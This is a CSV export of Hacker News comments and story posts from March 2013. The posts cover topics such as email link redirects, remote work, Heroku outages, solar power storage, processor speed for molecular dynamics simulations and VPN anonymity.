ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
5312806,comment,5312213,5312753,3,0,signed0,,,"In this case one could simply write a script that forwards the request from your own domain to the third party system. It could be done on the server in such a way that the user would never leave your own domain:<p>1. User clicks <a href=""http://links.example.com/?redirect=example.com/reset_password"" rel=""nofollow"">http://links.example.com/?redirect=example.com/reset_passwor...</a><p>2. The server running on links.example.com makes a request to the third party web server<p>3. The server redirects the user to <a href=""http://example.com/reset_password"" rel=""nofollow"">http://example.com/reset_password</a>",1362293981
5312805,comment,5312213,5312753,2,0,LaGrange,,,"I would have believed you if I weren't working for a website with large emails campaigns. And this comment wasn't even aimed at ""the developer"", not really  but at anyone involved in decisions like this.",1362293935
5312804,comment,5311668,5312533,2,0,ido,,,"That used to be the situation for me (or at least I thought it was), but after a few years of being self employed (and most of that time having no choice but to make working from home function) I now have no problems being productive at home (or at least not much more so than at the office).",1362293930
5312803,comment,5310911,5311453,1,0,jaggederest,,,"On a society wide scale? We only need as much solar power as is taken up by rooftops <i>if</i> we have effective storage. Once you start reaching 25% penetration of electric cars hooked to the grid, it's compensation for base load.",1362293885
5312802,story,,,4,6,meisterbrendan,"Ask HN: Where do you go for inspiration?",,"How do you stay motivated and inspired to work on your side projects? I have some stuff I'm working on, but haven't cracked the nut on making consistent progress yet.<p>I keep thinking of that Antoine de Saint-Exupery (dude who wrote The Little Prince) quote ""If you want to build a ship, don't drum up people together to collect wood and don't assign them tasks and work, but rather teach them to long for the endless immensity of the sea. I'm trying to keep loving ""the immensity of the sea"" in my side projects, but finding it difficult. What works for you?",1362293813
5312801,comment,5311168,5311926,1,0,bane,,,"""As a side note, I also found it funny that many are worried that the ""prestige"" of Harvard is besmirched, because the original meaning (now obsolete) of prestige was
  An illusion; a conjuring trick; a deception, an imposture.""<p>Great point...<p>Of course prestige <i>is</i> the primary product for sale at such a place of business.",1362293796
5312800,comment,5310602,5311761,3,0,DeepDuh,,,"Yes, the comment quality on HN seems to be quite bad when it comes to Heroku threads. Why do so many CS professionals appear to be attaching themselves emotionally to software tools? That's pretty much what I have to conclude if you can't admit that this PaaS provider has screwed up and deserves more scrutiny when deciding for the platform of your next project/migration.<p>Isn't one of the great things about the Software startup scene that we can decide freely on what tools to use? Except for very niche markets we <i>always</i> have alternatives, even if it means a bit more work on our sides.",1362293790
5312799,comment,5311668,5311894,3,0,ido,,,"What mostly bothers me is the commute, if I can get to the office at any given workplace within half an hour or less door-to-door (preferably 15 minutes & not via car) the barriers to coming to the office are significantly reduced.<p>At any rate I think the optimal situation for me is a mix of both.",1362293765
5312798,comment,5312762,5312767,20,0,revelation,,,"He doesn't say, but probably because they just don't have the bandwidth.<p>And thats where all this future proof talk goes deaf. New interfaces will only have <i>more</i> bandwidth, thats the whole point. Meanwhile, Lightning still has the same bandwidth and theres still a considerable penalty in serializing any other interface.<p>If they can't even do 1080p lossless right now, they are in much deeper trouble for the future.",1362293725
5312797,comment,5310646,5312608,3,0,raverbashing,,,"Yes, keep telling yourself that<p>You see, you are already answering things in a menacing tone, I think you may be a risk to others, and maybe to yourself.",1362293666
5312796,story,,,1,0,Xcelerate,"Ask HN: What is the fastest sequential FLOPS?",,"I perform molecular dynamics (MD) simulations using a large number of parallel processor cores.  As more atoms are added to a system, more cores can be added to handle them.  Computational power is still mostly following Moore's law, so in the next few years, vastly larger systems will be capable of being simulated.<p>However, one problem is that the <i>speed</i> of an individual processor core hasn't improved very much in a while.  This poses a scientific problem in that it becomes very difficult to simulate systems past a few microseconds.  Special purpose computers such as Anton [ http://en.wikipedia.org/wiki/Anton_(computer) ] have been built using highly-specialized ASICs that can reach into the millisecond timescales, but I'm afraid scientific discovery in the seconds range (for MD) is not going to ever happen unless we either 1) suddenly discover a new technology for increasing transistor speed or 2) develop ground-breaking simulation algorithms.<p>My question is:  what is the fastest sequential FLOPS that a general purpose, commodity processor can currently achieve?",1362293639
5312795,comment,5310592,5312340,1,0,OGinparadise,,,"Yes, but the breakup fee for wasting 18-24 months at their stage might not have been enough.",1362293617
5312794,comment,5312484,5312653,50,0,pg,,,"This post is brief, but not fluffy.  I wish he had dug more into the forces at work here.  But it is an important point nonetheless.<p>And we on HN could do better than merely dismiss it.  We could try to dig into the underlying forces ourselves.  E.g. not all hobbies consist of making the Apple I.  So which do, and why?  Are the things called hobbies two different types of work that are conflated by clueless observers simply because they're not the worker's day job?  Or is there some amount of crossover between inventing the future and merely playing around?<p>Instead the top comment is the forum analogue of a fluff post: a cynical dismissal based on some presumed bad intention on the writer's part.",1362293612
5312793,comment,5310602,5310602,1,0,neya,,,"Just curious - Why after all this mess, didn't Rap genius recommend Engine Yard (Heroku's competitor). Is it because they had similar issues too, or did they simply ignore not trying to switch over to a different provider altogether? Just curious.",1362293568
5312792,comment,5305925,5307550,2,0,seandougall,,,"One other pretty common (and slightly less imaginary) trick is to nudge the master fader up about 1dB and play the same mix again for the client. For some psychoacoustic reason I don't fully grok, we perceive things as sounding better when they're louder, even if the difference is too small to register consciously.",1362293453
5312791,comment,5311361,5312205,1,0,ithkuil,,,"generally you are right, it would be far easier to hide these kind of choices if the language allowed it.<p>However currently javascript has a purely event driven model and this means that you have trouble fitting in even a purely CPU bound computation, as it would block the responsiveness of your UI (or other concurrent requests if your are doing server side JS). That's why there was a need for creating something like WebWorkers.",1362293427
5312790,comment,5305925,5307735,5,0,igrekel,,,"It wasn't a joke, I didn't explain myself properly. 
When some people pick up their heavy suitcase after slouching for a few hours, their back locks in and the airport has to put them in a wheelchair and take care of them and their luggage. Having people walk a few minutes more actually reduces the chances of that happening.",1362293262
5312789,comment,5310911,5311892,1,0,ak217,,,"They are also closer to the consumer, negating a big chunk of the transmission losses.<p>Also, while thermal electric plants may be more efficient at large scale, I'm not sure how that works at small scale, or if there is a difference in how much capacity they lose in cloudy weather compared to photovoltaics. Actually, I wonder what the ratio of installed photovoltaics to thermals is per region and generator scale.",1362293226
5312788,comment,5310280,5310889,3,0,wvenable,,,"Hasn't this argument been put to bed a long time ago?  Are there still people not burned by semantic keys or unconvinced by decades of education?",1362293188
5312787,comment,5312346,5312346,1,0,akurilin,,,"Amazon AutoRip is another nice touch. Every music CD I've ever purchased with them over the years is not available to me in the cloud as if I had purchased the MP3s as well.<p>Now if only we could do the same with Kindle.",1362293066
5312786,comment,5298663,5299344,1,0,eru,,,"If new people picking up the app have a problem simulating users, then how do you assume your users will go about picking up the up to actually use it?",1362293062
5312785,comment,5310266,5311931,1,0,UntitledNo4,,,"Eeeeee is the sound a dolphin makes. 
For the second one, please listen to Psycho Killer by The Talking Heads",1362293026
5312784,comment,5312003,5312658,1,0,slurgfest,,,"Corollary: CS doesn't need to be a science",1362293023
5312783,comment,5309896,5309896,1,0,sparkygoblue,,,"Ugh.  Articles like this make me want to join the PHP sucks crowd, and I really hate the PHP sucks crowd.",1362292982
5312782,story,,,158,107,chaostheory,"VPN Services That Take Your Anonymity Seriously",http://torrentfreak.com/vpn-services-that-take-your-anonymity-seriously-2013-edition-130302/,,1362292978
